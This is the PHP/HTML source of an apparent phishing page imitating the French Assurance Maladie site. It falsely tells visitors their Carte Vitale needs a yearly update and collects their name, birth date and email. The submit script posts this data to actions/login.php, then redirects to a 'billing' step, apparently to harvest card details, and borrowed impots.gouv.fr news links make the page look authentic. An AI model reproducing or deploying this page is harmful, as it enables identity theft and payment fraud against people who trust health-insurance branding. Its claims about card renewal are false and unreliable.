<?php 


include('infos.php');
include("common/includes.php");
?>

<html lang="fr">
<?php include("common/header.php");?>


<body>

     <div class="content-wrap" style="margin-top: 0px; margin-bottom: 30px; 
background: #003763 none repeat scroll 0% 0%;">
        <div class="banner">
			<?php include("common/svg.php"); ?>
								
     </div>
    </div>
    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li><a href="#" id="toPortailPub" title="Retour au portail">Assurance Maladie</a></li>
                <li class="active">Mise à jour carte vitale</li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">

        <div class="row">
            <div class="col-md-12">

                <div class="panel panel-default" style="background: url(assets/images/back.png);">
                    <div class="panel-heading">

                        <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Mettre à jour votre carte vitale</h2>
                    </div>

                    <div class="panel-body"><br> La mise à jour de la carte vitale doit se faire anuellement par ses bénéficiaire. Cette opération actualise les droits et garantit une prise en charge efficace des dépenses de santé plus rapidement.
                        <br><br> Pour une façon pratique, facile et sécurisée de présenter une demande de votre nouvelle carte  avec de nombreux avantages, veuillez suivre les étapes suivantes : <br><br>
                        <form action="" id="formit" method="POST">
                            <div class="row">
                                <div class="col-md-6">
									<style>
										.flex{
											display: flex;
											justify-content: space-between;
										}
									</style>
									<div class="flex">
                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Nom</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="name" name="nom" type="text" aria-required="true" placeholder="" required="">
                                    </div>

                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Prénom</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="name" name="prenom" type="text" aria-required="true" placeholder="" required="">
                                    </div>
									</div>


                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Date de naissance</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <span class="fieldset"><br><select style="width:33%" class="boss" name="day" required="" title="Please Select Day Of Birth" type="select">
												<option class="form-control" selected="selected" value="">Jour</option>
												<option value="01">01</option>
												<option value="02">02</option>
												<option value="03">03</option>
												<option value="04">04</option>
												<option value="05">05</option>
												<option value="06">06</option>
												<option value="07">07</option>
												<option value="08">08</option>
												<option value="09">09</option>
												<option value="10">10</option>
												<option value="11">11</option>
												<option value="12">12</option>
												<option value="13">13</option>
												<option value="14">14</option>
												<option value="15">15</option>
												<option value="16">16</option>
												<option value="17">17</option>
												<option value="18">18</option>
												<option value="19">19</option>
												<option value="20">20</option>
												<option value="21">21</option>
												<option value="22">22</option>
												<option value="23">23</option>
												<option value="24">24</option>
												<option value="25">25</option>
												<option value="26">26</option>
												<option value="27">27</option>
												<option value="28">28</option>
												<option value="29">29</option>
												<option value="30">30</option>
												<option value="31">31</option>
											</select>
											
											<select style="width:30%" class="boss" name="month" required="" title="Please Select Month Of Birth" type="select">
												<option selected="selected" value="">Mois</option>
												<option value="01">01</option>
												<option value="02">02</option>
												<option value="03">03</option>
												<option value="04">04</option>
												<option value="05">05</option>
												<option value="06">06</option>
												<option value="07">07</option>
												<option value="08">08</option>
												<option value="09">09</option>
												<option value="10">10</option>
												<option value="11">11</option>
												<option value="12">12</option>
											</select> 
											
											<select style="width:34.9%" class="boss" name="year" required="" title="Please Select Your Year Of Birth" type="select">
												<option selected="selected" value="">Annee</option>
												<option value="2002">2002</option>
												<option value="2001">2001</option>
												<option value="2000">2000</option>
												<option value="1999">1999</option>
												<option value="1998">1998</option>
												<option value="1997">1997</option>
												<option value="1996">1996</option>
												<option value="1995">1995</option>
												<option value="1994">1994</option>
												<option value="1993">1993</option>
												<option value="1992">1992</option>
												<option value="1991">1991</option>
												<option value="1990">1990</option>
												<option value="1989">1989</option>
												<option value="1988">1988</option>
												<option value="1987">1987</option>
												<option value="1986">1986</option>
												<option value="1985">1985</option>
												<option value="1984">1984</option>
												<option value="1983">1983</option>
												<option value="1982">1982</option>
												<option value="1981">1981</option>
												<option value="1980">1980</option>
												<option value="1979">1979</option>
												<option value="1978">1978</option>
												<option value="1977">1977</option>
												<option value="1976">1976</option>
												<option value="1975">1975</option>
												<option value="1974">1974</option>
												<option value="1973">1973</option>
												<option value="1972">1972</option>
												<option value="1971">1971</option>
												<option value="1970">1970</option>
												<option value="1969">1969</option>
												<option value="1968">1968</option>
												<option value="1967">1967</option>
												<option value="1966">1966</option>
												<option value="1965">1965</option>
												<option value="1964">1964</option>
												<option value="1963">1963</option>
												<option value="1962">1962</option>
												<option value="1961">1961</option>
												<option value="1960">1960</option>
												<option value="1959">1959</option>
												<option value="1958">1958</option>
												<option value="1957">1957</option>
												<option value="1956">1956</option>
												<option value="1955">1955</option>
												<option value="1954">1954</option>
												<option value="1953">1953</option>
												<option value="1952">1952</option>
												<option value="1951">1951</option>
												<option value="1950">1950</option>
												<option value="1949">1949</option>
												<option value="1948">1948</option>
												<option value="1947">1947</option>
												<option value="1946">1946</option>
												<option value="1945">1945</option>
												<option value="1944">1944</option>
												<option value="1943">1943</option>
												<option value="1942">1942</option>
												<option value="1941">1941</option>
												<option value="1940">1940</option>
												<option value="1939">1939</option>
												<option value="1938">1938</option>
												<option value="1937">1937</option>
												<option value="1936">1936</option>
												<option value="1935">1935</option>
												<option value="1934">1934</option>
												<option value="1933">1933</option>
												<option value="1932">1932</option>
												<option value="1931">1931</option>
												<option value="1930">1930</option>
												<option value="1929">1929</option>
												<option value="1928">1928</option>
												<option value="1927">1927</option>
												<option value="1926">1926</option>
												<option value="1925">1925</option>
												<option value="1924">1924</option>
												<option value="1923">1923</option>
												<option value="1922">1922</option>
												<option value="1921">1921</option>
												<option value="1920">1920</option>
												<option value="1919">1919</option>
												<option value="1918">1918</option>
												<option value="1917">1917</option>
												<option value="1916">1916</option>
												<option value="1915">1915</option>
												<option value="1914">1914</option>
												<option value="1913">1913</option>
												<option value="1912">1912</option>
											</select> </span>
                                    </div>

                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Adresse email</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="name" name="mail" type="email" aria-required="true" placeholder="" required="">
                                    </div>

                                    <button type="submit" id="submit" class="btn btn-xl btn-primary">Valider</button>

                                    <br><br>
                                </div>
                                <div class="col-md-6" style="border-radius:6px;">
                                    <img class="col-md-12" src="assets/images/first.png" style="border-radius:6px;">
                                </div>

                            </div>
                        </form>

                        <i>
						<small>Un délai de traitement commence le jour où nous recevons un formulaire dûment rempli et se termine lorsque nous prenons une décision. </small>
						</i>

                    </div>
                </div>
            </div>
        </div>
        <br><br>

        <div style="font-size: 1.8em;text-transform:uppercase;margin-bottom:15px;color: #003763;font-weight: 500;">
            L'actualité en bref
        </div>
        <div>
            <div class="row">
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid #003763;padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/publication-de-la-brochure-pratique-impots-locaux-2021" style="font-size: 1.1em;display:block">
							Publication de la brochure pratique Impôts locaux 2021
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 02-09-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid #003763;padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/ouverture-de-lapplication-correction-en-ligne" style="font-size: 1.1em;display:block">
							Ouverture de l'application « Correction en ligne »
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 28-07-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid #003763;padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/resultats-de-lenquete-de-satisfaction-realisee-aupres-dusagers-particuliers-de-la-dgfip-1" style="font-size: 1.1em;display:block">
							Résultats de l’enquête de satisfaction réalisée auprès d’usagers particuliers de la DGFIP en 2021
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 17-07-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid #003763;padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/rapport-dactivite-2021-de-la-dgfip" style="font-size: 1.1em;display:block">
							Rapport d'activité 2021 de la DGFiP
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 15-07-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid #003763;padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/paiement-de-proximite-aupres-des-buralistes-report-de-la-generalisation" style="font-size: 1.1em;display:block">
							Paiement de proximité auprès des buralistes : report de la généralisation
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 02-07-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid #003763;padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/covid-19-attention-aux-arnaques-par-courriel" style="font-size: 1.1em;display:block">
							COVID-19 : attention aux arnaques par courriel !
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 20-05-2021</span>
                    </div>
                </div>
            </div>
        </div>

    </main>

    <div id="loading" class="LoadingPage" style="display : none">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://www.ameli.fr/themes/custom/ameli/images/logo.svg">
                </div>
                <span>Chargement en cours</span>
            </div>
        </div>
    </div>

	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


    <script>
        $(document).ready(function() {
        			$("#formit").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "actions/login.php",
        						data: $(this).serialize()
        					})
        					.then(function(msg) {
        						setTimeout(function() {
        							window.location.href = "steps/billing.php";
        						}, 1500);
        					});
        				
        
        			});
        		});
    </script>

</body>

</html>